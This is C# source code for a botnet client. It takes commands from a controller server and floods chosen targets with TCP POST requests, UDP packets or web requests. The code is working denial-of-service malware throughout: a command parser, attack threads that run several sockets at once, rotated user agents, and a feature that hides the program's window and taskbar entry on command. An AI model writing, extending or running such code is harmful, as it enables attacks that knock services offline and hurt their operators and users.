using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BotnetClient
{
    class Utilities
    {
        // Main Form controls (used for client list and log)
        public MetroFramework.Controls.MetroListView logList;
        public MetroFramework.Forms.MetroForm form;
        // Client Variables
        public Socket socket;
        public Thread thread;
        static string HostOrIP = "localhost", type = "TCP", serverIPV4 = "192.168.1.44", previousLogMessage = "";
        Int32 serverPort = 11111;
        static int Port = 80, Delay = 15000, SockCount = 8, packetSize = 32;
        static Boolean restart = false, attacking = false, hidden = false;
        static Random Rand = new Random(); // Random number generator
        static string[] UserAgents = // User agent list
        {
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
        };
        List<AttackConnection> attackConnections = new List<AttackConnection>();

        public Utilities(MetroFramework.Controls.MetroListView logListView, MetroFramework.Forms.MetroForm mainForm)
        {
            logList = logListView;
            form = mainForm;
        }


        /// <summary>
        /// Main Client Thread
        /// </summary>
        public void clientThread()
        {
            // Variables to manage the status of the Host-Server
            Boolean run = true;
            Boolean stayConnected = true;
            while (run)
            {
                try
                {
                    // Establish the remote endpoint for the socket. This example uses port 11111 on the local computer. 
                    IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                    IPAddress ipAddr;
                    try
                    {
                        // Try to set socket IP address to current IPV4 address (only works on wifi as of now)
                        ipAddr = IPAddress.Parse(serverIPV4);
                    }
                    catch (Exception e)
                    {
                        // Fail safe = grabbing some other ip address that only works when all clients are on same pc as host
                        ipAddr = ipHost.AddressList[0];
                    }
                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, serverPort);
                    // Creation TCP/IP Socket using Socket Class Costructor 
                    socket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                    try
                    {
                        // Connect Socket to the remote endpoint using method Connect() 
                        log("Connecting to Host-Server...");
                        socket.Connect(localEndPoint);
                        log("Connected to " + ipAddr.ToString() + ":" + serverPort.ToString());
                        while (stayConnected)
                        {
                            // Send reponce message to Host-Server
                            // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE THIS IS WHERE IT WOULD GO
                            if (false)
                            {
                                string messageToSend = "[Alive: true], [RunningAttack: true]<EOF>";
                                byte[] messageSent = Encoding.ASCII.GetBytes(messageToSend);
                                log("Sending Message '" + messageToSend + "'...");
                                int byteSent = socket.Send(messageSent);
                            }

                            // Recieve Update from Host-Server
                            try
                            {
                                // Data buffer 
                                byte[] messageReceived = new byte[1024];
                                // Recieve message through data buffer
                                int byteRecv = socket.Receive(messageReceived);
                                // Convert message to string for parsing
                                string message = Encoding.ASCII.GetString(messageReceived, 0, byteRecv);
                                // Handle message types
                                if (message.Contains("["))
                                {
                                    if (message.Contains("ping!"))
                                    {
                                        // clear ping message if it somehow gets in here (we should probably fix this)
                                        message = message.Replace("ping!", "");
                                    }
                                    // Print split updates into string array
                                    log("Update recieved...");
                                    //log(message);
                                    string[] updates = message.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
                                    foreach (string item in updates)
                                    {
                                        try
                                        {
                                            if (item.Contains("IP:"))
                                            {
                                                HostOrIP = item.Substring(item.IndexOf(":") + 1);
                                            }
                                            else if (item.Contains("Port:"))
                                            {
                                                Port = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("Delay:"))
                                            {
                                                Delay = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("Sockets:"))
                                            {
                                                SockCount = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("Packet Size:"))
                                            {
                                                packetSize = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("Type:"))
                                            {
                                                type = item.Substring(item.IndexOf(":") + 1).Trim();

                                            }
                                            else if (item.Contains("Attack:"))
                                            {
                                                attacking = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                                if (attacking)
                                                {
                                                    log("Starting attack...");
                                                    for (int i = 0; SockCount > i; i++)
                                                    {
                                                        try
                                                        {
                                                            AttackConnection newConnection = new AttackConnection();
                                                            log("Starting attack thread " + newConnection.guid + "...");
                                                            newConnection.attackThread = new Thread(() => attackV2(newConnection));
                                                            newConnection.attackThread.Start();
                                                        }
                                                        catch (Exception e)
                                                        {
                                                            log("Error starting attack thread " + e.ToString());
                                                        }
                                                        //try { InitClient(new TcpClient()); } catch { } // DISABLED FOR TESTING/CREATING V2
                                                    }
                                                }
                                            }
                                            else if (item.Contains("Restart"))
                                            {
                                                // This needs some work... it doesnt directly cause the restart, but rather it triggers a bunch of exceptions and we call restart later again
                                                restart = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                                if (restart)
                                                {
                                                    Application.Restart();
                                                    Environment.Exit(0);
                                                }
                                            }
                                            else if (item.Contains("Hidden"))
                                            {
                                                hidden = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                                toggleHidden();
                                            }
                                        }
                                        catch (Exception error)
                                        {
                                            log("Error parsing update... " + error.ToString());
                                        }
                                    }
                                }
                                else if (!message.Contains("ping!"))
                                {
                                    stayConnected = false;
                                }
                                // Increase updateCounter & sleep thread to improve performance
                                Thread.Sleep(1000);
                            }
                            catch (Exception e) { } // no message recieved
                        }
                        // Close Socket using the method Close() 
                        try
                        {
                            socket.Shutdown(SocketShutdown.Both);
                            socket.Close();
                        }
                        catch (Exception e) { }
                        run = false;
                        log("Disconnected from host...");
                        if (!restart)
                        {
                            log("Exiting...");
                            Environment.Exit(0);
                        }
                    }
                    // Manage of Socket's Exceptions 
                    catch (ArgumentNullException ane)
                    {
                        log("ArgumentNullException : " + ane.ToString());
                    }
                    catch (SocketException se)
                    {
                        //log("SocketException : " + se.ToString()); shhhhhhh
                    }
                    catch (Exception e)
                    {
                        log("Unexpected exception : " + e.ToString());
                    }
                }
                catch (Exception e)
                {
                    log(e.ToString());
                    if (restart)
                    {
                        // we have to also call restart here for some reason
                        log("Restarting...");
                        Application.Restart();
                        Environment.Exit(0);
                    }
                }
            }
        }
        /// <summary>
        /// log() function, used to display log messages to the user
        /// </summary>
        /// <param name="logMessage">Message to be displayed to user</param>
        public void log(string logMessage)
        {
            try
            {
                // save raw message
                string raw = logMessage;
                // Build log message with date and message
                logMessage = "[" + DateTime.UtcNow + "] " + logMessage;
                // make sure we are not printing duplicate messages
                if (raw != previousLogMessage)
                {
                    // Write to console in case of exception
                    Console.WriteLine(logMessage);
                    try
                    {
                        // Create new listviewitem for the log message
                        ListViewItem newItem = new ListViewItem();
                        newItem.Text = logMessage;
                        // Use Invoke() to access the log listview from other threads (very big brain)
                        logList.Invoke((MethodInvoker)delegate {
                            // Running on the UI thread
                            logList.Items.Add(newItem);
                            logList.Columns[0].Width = logList.Width - 35;
                            logList.EnsureVisible(logList.Items.Count - 1);
                        });
                        previousLogMessage = raw;
                    }
                    catch (Exception e)
                    {
                        // ughhhhhhhhhhhhh something broke
                        //Console.WriteLine("HEY SILLY, THIS IS PREVENTING THE LOG FROM WORKING: " + e.ToString());
                    }
                    //try
                    //{
                    //    File.AppendAllText("log.txt", logMessage + Environment.NewLine);
                    //}
                    //catch (Exception e)
                    //{
                    //    Console.WriteLine(e.ToString());
                    //}
                }
            }
            catch (Exception e)
            {

            }
        }
        /// <summary>
        /// Toggles visibility of client
        /// </summary>
        public void toggleHidden()
        {
            if (hidden)
            {
                form.Invoke((MethodInvoker)delegate {
                    // Running on the UI thread
                    form.Hide();
                    form.ShowInTaskbar = false;
                });

            }
            else if (!hidden)
            {
                form.Invoke((MethodInvoker)delegate {
                    // Running on the UI thread
                    form.Show();
                    form.ShowInTaskbar = true;
                });
            }
        }
        /// <summary>
        /// Random string generator, generates string of specified length (packet size) for attack packet data
        /// </summary>
        /// <param name="length"></param>
        /// <returns></returns>
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[Rand.Next(s.Length)]).ToArray());
        }
        /// <summary>
        /// Version 2 of the attack method. allows for TCP/UDP/WEB specification
        /// </summary>
        /// <param name="connection"></param>
        private void attackV2(AttackConnection connection)
        {
            Boolean shouldAttack = attacking;
            if (type == "TCP")
            {
                try
                {
                    TcpClient client = new TcpClient(HostOrIP.Trim(), Port);
                    // Get a client stream for reading and writing.
                    NetworkStream stream = client.GetStream();
                    log("[" + connection.guid + "] Starting TCP attack...");
                    while (shouldAttack)
                    {
                        shouldAttack = attacking;
                        string message = Guid.NewGuid().ToString();
                        Byte[] data = Encoding.ASCII.GetBytes(message);
                        try
                        {
                            string post = $"POST / HTTP/1.1\r\nHost: " + HostOrIP.Trim() + " \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {" + UserAgents[new Random().Next(UserAgents.Length)] + "}\r\nContent-length: 5235\r\n\r\n";
                            byte[] buffer = Encoding.UTF8.GetBytes(post);
                            client.Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                            log($"Packet has been sent [{DateTime.Now.ToLongTimeString()}]");
                        }
                        catch (Exception e)
                        {
                            log("Problem sending packet: " + e.ToString());
                            stream.Close();
                            client.Close();
                            client.Dispose();
                            shouldAttack = false;
                        }
                        Thread.Sleep(Delay);
                    }
                }
                catch (Exception e)
                {
                    log("Error perfomring " + type + " attack... " + e.ToString());
                }

            }
            else if (type == "UDP")
            {
                UdpClient client = new UdpClient(HostOrIP.Trim(), Port);
                log("[" + connection.guid + "] Starting UDP attack...");
                while (shouldAttack)
                {
                    shouldAttack = attacking;
                    string message = RandomString(packetSize);
                    Byte[] sendBytes = Encoding.ASCII.GetBytes(message);
                    try
                    {
                        client.Send(sendBytes, sendBytes.Length);
                    }
                    catch (Exception e)
                    {
                        log("Problem sending " + type + " packet on thread " + connection.guid + ". Closing thread...");
                        client.Close();
                        client.Dispose();
                        shouldAttack = false;
                    }
                    Thread.Sleep(Delay);
                }
            }
            else if (type == "WEB")
            {
                WebClient client = new WebClient();
                log("[" + connection.guid + "] Starting WEB attack...");
                while (shouldAttack)
                {
                    try
                    {
                        client.DownloadString(HostOrIP);
                    }
                    catch (Exception e)
                    {

                    }
                    Thread.Sleep(Delay);
                }
            }
            else
            {
                log("Attack type could not be determined... (type = '" + type + "'");
            }
            log("Attack thread " + connection.guid + " has finished running...");
        }

    }
}
